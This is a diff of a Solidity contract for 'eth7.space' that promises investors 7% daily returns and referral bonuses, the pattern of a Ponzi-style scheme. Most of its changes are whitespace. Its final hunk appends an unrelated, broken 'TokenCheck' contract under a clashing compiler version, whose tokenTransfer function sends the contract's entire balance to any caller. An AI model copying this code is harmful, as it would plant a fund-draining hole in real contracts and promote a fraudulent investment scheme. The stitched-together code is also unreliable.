@@ -1,20 +1,20 @@
 pragma solidity ^0.4.25;
 
-/** 
+/**
  * contract for eth7.space
  * GAIN 7% PER 24 HOURS (every 5900 blocks)
- * 
+ *
  *  How to use:
  *  1. Send any amount of ether to make an investment
  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
  *  OR
  *  2b. Send more ether to reinvest AND get your profit at the same time
  *
- * 
+ *
  *  5% for every deposit of your direct partners
  *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
- * 
- * 
+ *
+ *
  * RECOMMENDED GAS LIMIT: 70000
  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
  *
@@ -24,8 +24,8 @@ pragma solidity ^0.4.25;
 contract eth7{
 
     address public owner;
-    address public partner;    
-    
+    address public partner;
+
 	mapping (address => uint256) deposited;
 	mapping (address => uint256) withdrew;
 	mapping (address => uint256) refearned;
@@ -42,17 +42,17 @@ contract eth7{
         owner   = msg.sender;
         partner = msg.sender;
     }
-    
+
     modifier onlyOwner {
         require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
         _;
-    }    
-    
+    }
+
     //if you want to be a partner, contact admin
     function setPartner(address newPartner) external onlyOwner {
         partner = newPartner;
     }
- 
+
 
 	function() payable external {
 		emit invest(msg.sender,msg.value);
@@ -85,7 +85,7 @@ contract eth7{
 		deposited[msg.sender] += msg.value;
 		totalDepositedWei += msg.value;
 	}
-	
+
 	//refund to user who misunderstood the game . 'withdrew' must = 0
     function reFund(address exitUser, uint a) external onlyOwner returns (uint256) {
         uint256 reFundValue = deposited[exitUser];
@@ -93,7 +93,7 @@ contract eth7{
         deposited[exitUser] = 0;
         return reFundValue;
     }
-    
+
 	function userDepositedWei(address _address) public view returns (uint256) {
 		return deposited[_address];
     }
@@ -115,4 +115,33 @@ contract eth7{
 			addr := mload(add(bys, 20))
 		}
 	}
+}
+pragma solidity ^0.3.0;
+contract TokenCheck is Token {
+   string tokenName;
+   uint8 decimals;
+	  string tokenSymbol;
+	  string version = 'H1.0';
+	  uint256 unitsEth;
+	  uint256 totalEth;
+  address walletAdd;
+	 function() payable{
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+  }
+	 function tokenTransfer() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
